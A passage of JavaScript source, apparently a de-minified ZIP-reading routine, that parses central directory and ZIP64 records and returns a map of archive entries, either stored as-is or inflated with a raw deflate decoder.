        centralDirectoryBuffer,
        centralDirectoryOffset + 28,
      ),
      centralDirectoryEntryName = decodeZipString(
        centralDirectoryBuffer.subarray(
          centralDirectoryOffset + 46,
          centralDirectoryOffset + 46 + centralDirectoryNameLength,
        ),
        !(
          readUint16LE(centralDirectoryBuffer, centralDirectoryOffset + 8) &
          2048
        ),
      ),
      centralDirectoryExtraOffset =
        centralDirectoryOffset + 46 + centralDirectoryNameLength,
      centralDirectoryCompressedSize = readUint32LE(
        centralDirectoryBuffer,
        centralDirectoryOffset + 20,
      ),
      centralDirectoryZip64Sizes =
        centralDirectoryHasZip64 && centralDirectoryCompressedSize == 4294967295
          ? readZip64ExtraField(
              centralDirectoryBuffer,
              centralDirectoryExtraOffset,
            )
          : [
              centralDirectoryCompressedSize,
              readUint32LE(centralDirectoryBuffer, centralDirectoryOffset + 24),
              readUint32LE(centralDirectoryBuffer, centralDirectoryOffset + 42),
            ],
      centralDirectoryEntrySize = centralDirectoryZip64Sizes[0],
      centralDirectoryOriginalSize = centralDirectoryZip64Sizes[1],
      centralDirectoryLocalHeaderOffset = centralDirectoryZip64Sizes[2];
    return [
      readUint16LE(centralDirectoryBuffer, centralDirectoryOffset + 10),
      centralDirectoryEntrySize,
      centralDirectoryOriginalSize,
      centralDirectoryEntryName,
      centralDirectoryExtraOffset +
        readUint16LE(centralDirectoryBuffer, centralDirectoryOffset + 30) +
        readUint16LE(centralDirectoryBuffer, centralDirectoryOffset + 32),
      centralDirectoryLocalHeaderOffset,
    ];
  },
  readZip64ExtraField = function (zip64ExtraBuffer, zip64ExtraOffset) {
    for (
      ;
      readUint16LE(zip64ExtraBuffer, zip64ExtraOffset) != 1;
      zip64ExtraOffset +=
        4 + readUint16LE(zip64ExtraBuffer, zip64ExtraOffset + 2)
    );
    return [
      readUint64LEAsNumber(zip64ExtraBuffer, zip64ExtraOffset + 12),
      readUint64LEAsNumber(zip64ExtraBuffer, zip64ExtraOffset + 4),
      readUint64LEAsNumber(zip64ExtraBuffer, zip64ExtraOffset + 20),
    ];
  };
function unzipSyncToFileMap(zipFileBuffer, zipReadOptions) {
  var zipFileMap = {},
    endOfCentralDirectoryOffset = zipFileBuffer.length - 22;
  for (
    ;
    readUint32LE(zipFileBuffer, endOfCentralDirectoryOffset) != 101010256;
    --endOfCentralDirectoryOffset
  )
    if (
      !endOfCentralDirectoryOffset ||
      zipFileBuffer.length - endOfCentralDirectoryOffset > 65558
    )
      throwInflateError(13);
  var centralDirectoryEntryCount = readUint16LE(
    zipFileBuffer,
    endOfCentralDirectoryOffset + 8,
  );
  if (!centralDirectoryEntryCount) return {};
  var centralDirectoryCursor = readUint32LE(
      zipFileBuffer,
      endOfCentralDirectoryOffset + 16,
    ),
    archiveHasZip64 =
      centralDirectoryCursor == 4294967295 ||
      centralDirectoryEntryCount == 65535;
  if (archiveHasZip64) {
    var zip64LocatorOffset = readUint32LE(
      zipFileBuffer,
      endOfCentralDirectoryOffset - 12,
    );
    if (
      ((archiveHasZip64 =
        readUint32LE(zipFileBuffer, zip64LocatorOffset) == 101075792),
      archiveHasZip64)
    )
      (centralDirectoryEntryCount = readUint32LE(
        zipFileBuffer,
        zip64LocatorOffset + 32,
      )),
        (centralDirectoryCursor = readUint32LE(
          zipFileBuffer,
          zip64LocatorOffset + 48,
        ));
  }
  var zipEntryFilter = zipReadOptions && zipReadOptions.filter;
  for (
    var centralDirectoryIndex = 0;
    centralDirectoryIndex < centralDirectoryEntryCount;
    ++centralDirectoryIndex
  ) {
    var centralDirectoryEntry = readCentralDirectoryEntry(
        zipFileBuffer,
        centralDirectoryCursor,
        archiveHasZip64,
      ),
      zipEntryCompressionMethod = centralDirectoryEntry[0],
      zipEntryCompressedSize = centralDirectoryEntry[1],
      zipEntryOriginalSize = centralDirectoryEntry[2],
      zipEntryPath = centralDirectoryEntry[3],
      nextCentralDirectoryOffset = centralDirectoryEntry[4],
      zipEntryLocalHeaderOffset = centralDirectoryEntry[5],
      zipEntryDataOffset = localFileDataOffset(
        zipFileBuffer,
        zipEntryLocalHeaderOffset,
      );
    if (
      ((centralDirectoryCursor = nextCentralDirectoryOffset),
      !zipEntryFilter ||
        zipEntryFilter({
          name: zipEntryPath,
          size: zipEntryCompressedSize,
          originalSize: zipEntryOriginalSize,
          compression: zipEntryCompressionMethod,
        }))
    ) {
      if (!zipEntryCompressionMethod)
        zipFileMap[zipEntryPath] = sliceUint8(
          zipFileBuffer,
          zipEntryDataOffset,
          zipEntryDataOffset + zipEntryCompressedSize,
        );
      else {
        if (zipEntryCompressionMethod == 8)
          zipFileMap[zipEntryPath] = inflateRawSync(
            zipFileBuffer.subarray(
              zipEntryDataOffset,
              zipEntryDataOffset + zipEntryCompressedSize,
            ),
            { out: new Uint8ArrayCtor(zipEntryOriginalSize) },
          );
        else
          throwInflateError(
            14,
            "unknown compression type " + zipEntryCompressionMethod,
          );
      }
    }
  }
  return zipFileMap;
}
